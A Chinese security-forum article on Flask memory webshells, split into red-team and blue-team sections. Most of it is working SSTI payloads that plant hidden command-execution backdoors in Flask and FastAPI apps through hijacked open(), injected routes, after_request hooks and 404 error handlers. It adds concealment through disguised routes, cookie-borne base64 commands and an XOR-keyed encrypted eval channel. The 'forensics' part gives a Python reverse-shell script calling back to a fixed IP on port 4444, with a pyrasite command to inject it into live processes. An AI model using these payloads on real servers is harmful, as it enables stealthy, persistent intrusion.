---
title: 浅谈Flask内存马中的攻与防
url: https://forum.butian.net/share/4113
source: 奇安信攻防社区
date: 2025-02-12
fetch_date: 2025-10-06T20:32:29.012179
---

# 浅谈Flask内存马中的攻与防

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 浅谈Flask内存马中的攻与防

* [渗透测试](https://forum.butian.net/topic/47)

从内存的角度出发来帮助蓝队查杀Py内存马，并且结合红队视角辅助查杀

### Red Team
受限于篇幅，我这里就简单介绍一下flask内存马的几种姿势,以ssti为例子，本质上还是调用exec,eval,compile这些内置底层函数
参考了这篇文章，写的不错：[Flask 内存马 - caterpie的小站](https://www.caterpie771.cn/2024/09/27/flask-%E5%86%85%E5%AD%98%E9%A9%AC/#flask%3E213)
#### 函数劫持式(各路后端框架通用)
参考至:<https://err0r233.github.io/posts/25143.html> 目前全文没有相关思路，我只这里直接劫持底层的open()函数例如在flask中
```py
{{lipsum.\_\_globals\_\_['\_\_builtins\_\_']['exec']("global original\_open
original\_open=globals()['\_\_builtins\_\_']['open']
def custom\_open(\*args,\*\*kwargs):
from flask import request
if request.query\_params.get("cmd"):return \_\_import\_\_('io').StringIO(\_\_import\_\_('os').popen(request.query\_params.get("cmd")).read())
else:return original\_open(\*args,\*\*kwargs)
globals()['\_\_builtins\_\_']['open']=custom\_open")}}
```
这样再任何有返回open()文件内容的地方，就会输出cmd参数命令执行的结果了而且不会影响文件正常执行
稍加改动就可以在fastapi上动了
```py
config.\_\_init\_\_.\_\_globals\_\_['\_\_builtins\_\_']['exec']("global original\_open
original\_open=globals()['\_\_builtins\_\_']['open']
def custom\_open(\*args,\*\*kwargs):
if request.query\_params.get('cmd'):return \_\_import\_\_('io').StringIO(\_\_import\_\_('os').popen(request.query\_params.get('cmd')).read())
else:return original\_open(\*args,\*\*kwargs)
globals()['\_\_builtins\_\_']['open']=custom\_open",{"request":request})
```
#### 添加路由式(flask高版本)
经典中的经典，但由于flask添加了保护机制，我们需要通过先操作`url\_map`:
```py
url\_for.\_\_globals\_\_['\_\_builtins\_\_']['eval'](
"app.url\_map.add(
app.url\_rule\_class('/shell', methods=['GET'], endpoint='shell')
)",
{
'app':url\_for.\_\_globals\_\_['current\_app']
}
)
```
再去add\\_rule:
```py
url\_for.\_\_globals\_\_['\_\_builtins\_\_']['eval'](
"app.view\_functions.update(
{
'shell': lambda:\_\_import\_\_('os').popen(
app.request\_context.\_\_globals\_\_['request\_ctx'].request.args.get('cmd', 'whoami')
).read()
}
)",
{
'app':url\_for.\_\_globals\_\_['current\_app']
}
)
```
#### after\\_request式
这个比较安全，在业务逻辑处理完成后再去到木马代码
```py
{{url\_for.\_\_globals\_\_['\_\_builtins\_\_']['eval']("app.after\_request\_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=\_\_import\_\_(\'flask\').make\_response(\_\_import\_\_(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url\_for.\_\_globals\_\_['request'],'app':get\_flashed\_messages.\_\_globals\_\_['current\_app']})}}
```
#### 错误触发式
这个隐蔽性高，只有访问错误的界面才会触发，比如404
```py
{{url\_for.\_\_globals\_\_['\_\_builtins\_\_']['exec']("global exc\_class;global code;exc\_class,code=app.\_get\_exc\_class\_and\_code(404);app.error\_handler\_spec[None][code][exc\_class] = lambda error:\_\_import\_\_('os').popen(request.args.get('qwq')).read()", {'request':url\_for.\_\_globals\_\_['request'],'app':get\_flashed\_messages.\_\_globals\_\_['current\_app']})}}
```
#### 如何隐匿flask内存马?
例如我可以改成常见的路由：比如/api/log伪装成日志记录的api
```py
url\_for.\_\_globals\_\_['\_\_builtins\_\_']['eval'](
"app.view\_functions.update(
{
'api/user/log': lambda:\_\_import\_\_('os').popen(
app.request\_context.\_\_globals\_\_['request\_ctx'].request.args.get('cmd', 'whoami')
).read()
}
)",
{
'app':url\_for.\_\_globals\_\_['current\_app']
}
)
```
而且我们不要让命令和接受命令的参数为明文
```py
{{url\_for.\_\_globals\_\_['\_\_builtins\_\_']['exec']("global exc\_class;global code;exc\_class,code=app.\_get\_exc\_class\_and\_code(404);app.error\_handler\_spec[None][code][exc\_class] = lambda error: \_\_import\_\_('os').popen(\_\_import\_\_('base64').b64decode(request.cookies.get('userinfo')).decode('utf-8')).read()", {'request':url\_for.\_\_globals\_\_['request'],'app':get\_flashed\_messages.\_\_globals\_\_['current\_app']})}}
```
例如我在这里加入了从cookie读取,userinfo作为用户传参。而且结合errhandler，你只要随便访问一个不存在的路由就能触发内存马，这样就可以根据被攻击服务的实时情况，来随时调整，例如/api/AccoutINFO,/getData...
你还可以通过异或加密输入和使用json格式配合flask原生的加解密返回来实现流量层级的隐匿
```py
global exc\_class
global code
from itsdangerous import URLSafeSerializer
from flask import request
import json
exc\_class, code = app.\_get\_exc\_class\_and\_code(404)
secret\_key=''.join(chr(ord(a) ^ ord(b)) for a, b in zip('M8):M2uY[2%<^4+',',M[U?SX4>\_VT;XG'))
def execute\_command(cmd,secret\_key):
serializer = URLSafeSerializer(secret\_key)
encrypted\_userinfo=cmd
if not encrypted\_userinfo:
return
try:
command = serializer.loads(encrypted\_userinfo)
except Exception as e:
data = {
'status': 'error',
'message': 'Decryption failed',
'result': ''
}
try:
result=None
eval(command)
except Exception as e:
data = {
'status': 'error',
'message': str(e),
'result': ''
}
data = {
'status': 'ok',
'result': serializer.dumps(result)
}
return json.dumps(data)
app.error\_handler\_spec[None][code][exc\_class] = lambda error: execute\_command(request.cookies.get('userinfo'), secret\_key)
#{{url\_for.\_\_globals\_\_['\_\_builtins\_\_']['exec']("global exc\_class\nglobal code\nfrom itsdangerous import URLSafeSerializer\nfrom flask import request\nimport json\nexc\_class,code=app.\_get\_exc\_class\_and\_code(404)\nsecret\_key=''.join(chr(ord(a)^ord(b))for(a,b)in zip('M8):M2uY[2%<^4+',',M[U?SX4>\_VT;XG'))\ndef execute\_command(cmd,secret\_key):\n\tD='error';C='message';B='result';A='status';serializer=URLSafeSerializer(secret\_key);encrypted\_userinfo=cmd\n\tif not encrypted\_userinfo:return\n\ttry:command=serializer.loads(encrypted\_userinfo)\n\texcept Exception as e:data={A:D,C:'Decryption failed',B:''}\n\ttry:result=None;eval(command)\n\texcept Exception as e:data={A:D,C:str(e),B:''}\n\tdata={A:'ok',B:serializer.dumps(result)};return json.dumps(data)\napp.error\_handler\_spec[None][code][exc\_class]=lambda error:execute\_command(request.cookies.get('userinfo'),secret\_key)", {'request':url\_for.\_\_globals\_\_['request'],'app':get\_flashed\_messages.\_\_globals\_\_['current\_app']})}}
```
不过也有现成的pythonshell管理工具就是了，那个思路也不错
[orzchen/PyMemShell: Python内存马管理工具 Python MemShell](https://github.com/orzchen/PyMemShell)
### Blue Team
#### 从内存取证
想要根除内存马当然是去内存找啦，什么流量分析都是隔靴搔痒
目前这部分内容是全网独一家的研究,我自己是比较偏向于使用pyrasite这个库配合自己的脚本实现的
```py
#!/usr/bin/env python3
import socket
import sys
import os
import code
def reverse\_python\_shell(target\_ip, target\_port):
try:
# 创建套接字并连接到监听端
sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
sock.connect((target\_ip, target\_port))
# 将标准输入、输出、错误重定向到套接字
sock\_file = sock.makefile("rw")
sys.stdin = sock\_file
sys.stdout = sock\_file
sys.stderr = sock\_file
# 打印欢迎信息
print(f"Connected to {target\_ip}:{target\_port}")
print("Python interactive shell is ready. Type Python code to execute.")
# 启动 Python 交互式解释器
shell =code.InteractiveConsole(globals())
shell.interact()
except Exception as e:
# 如果发生错误，发送错误信息并关闭连接
try:
sock.sendall(f"Error: {str(e)}\n".encode())
except:
pass
finally:
sock.close()
if \_\_name\_\_ == "\_\_main\_\_":
# 配置目标 IP 和端口
target\_ip = "192.168.239.199" # 替换为监听端的 IP
target\_port = 4444 # 替换为监听端的端口
reverse\_python\_shell(target\_ip, target\_port)
```
将上述代码保存为shell-rev-py.py并且开好nc接受，然后再安装了pyrasite库的情况下直接注入
python进程：
```bash
pyrasite (pgrep -f "python3") shell-rev-py.py --verbose
```
便可大功告成
```php
PS C:\Users\20232\Desktop> ncat -lvvp 4444
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.239.199:26475.
Connected to 192.168.239.199:4444
Python interactive ...